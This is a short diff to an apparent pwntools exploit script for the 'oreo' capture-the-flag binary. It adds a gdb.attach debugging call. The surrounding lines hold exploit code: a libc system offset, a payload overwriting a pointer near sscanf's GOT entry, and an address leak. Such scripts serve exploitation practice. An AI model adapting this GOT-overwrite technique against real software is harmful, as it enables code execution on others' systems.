@@ -35,6 +35,7 @@ system_offset = 0x3ada0
 
 p = process("oreo", stdin=PTY)
 
+gdb.attach(p)
 name_payload1 = "aaa" + "bbbb"*6 + p32(sscanf_got-25)
 add(name_payload1, "hhh")
 sscanf = show_rifles()
